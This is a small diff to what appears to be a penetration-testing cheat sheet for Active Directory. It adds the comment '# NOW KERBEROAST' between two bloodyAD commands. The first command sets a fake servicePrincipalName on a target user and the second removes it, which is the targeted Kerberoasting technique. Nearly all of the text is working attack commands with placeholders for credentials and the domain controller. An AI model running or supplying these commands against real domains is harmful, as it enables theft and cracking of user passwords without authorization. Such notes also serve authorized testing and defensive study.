@@ -120,6 +120,8 @@ bloodyad -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object divano
 # Set SPN
 bloodyad -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName -v 'fake/<TARGET_USER>'
 
+# NOW KERBEROAST
+
 # Remove SPN
 bloodyad -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName
 ```
